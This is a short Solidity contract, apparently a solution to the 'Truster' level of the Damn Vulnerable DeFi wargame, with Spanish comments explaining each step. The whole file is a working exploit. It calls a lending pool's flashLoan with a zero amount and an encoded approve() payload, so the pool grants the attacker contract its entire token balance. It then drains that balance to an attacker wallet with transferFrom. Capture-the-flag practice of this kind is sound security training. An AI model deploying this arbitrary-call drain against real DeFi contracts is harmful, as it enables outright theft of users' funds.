// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol"; 
interface ITrusterLenderPool {
  function flashLoan(uint256 borrowAmount,address borrower,address target,bytes calldata data) external;
}

contract TrusterAttacker {

  constructor() {}

  function attack(IERC20 token, ITrusterLenderPool pool, address attackerWallet) public {
    //También es posible hardcodear el "1 millón ether", pero queda menos acoplado de la siguiente forma.
    uint256 poolBalance = token.balanceOf(address(pool));

    //Primero forzamos que TrusterLender nos realice un approve para utilizar todas sus reservas de DVT. 
    //MUCHO MUCHO CUIDADO con el string en encodeWithSignature --> no meter ni un espacio de más.
    bytes memory payload = abi.encodeWithSignature("approve(address,uint256)", address(this), poolBalance);
    pool.flashLoan(0, attackerWallet,address(token), payload);

    //Ahora tomamos los DVT directamente del contrato ERC20.
    token.transferFrom(address(pool), attackerWallet, poolBalance);
  }
}